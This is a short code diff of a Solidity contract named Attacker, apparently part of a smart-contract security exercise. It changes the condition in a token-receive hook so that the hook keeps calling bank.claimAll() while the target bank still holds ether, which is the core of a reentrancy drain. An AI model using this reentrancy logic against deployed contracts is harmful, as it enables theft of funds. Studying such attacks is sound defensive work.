@@ -68,7 +68,7 @@ contract Attacker is AccessControl, IERC777Recipient {
 			//for (uint i = 0; i < 10; i++){
 				//bank.claimAll();
 			//}
-			if (from.balance > 0) {
+			if (address(bank).balance > 0) {
            			bank.claimAll();
 				
        }
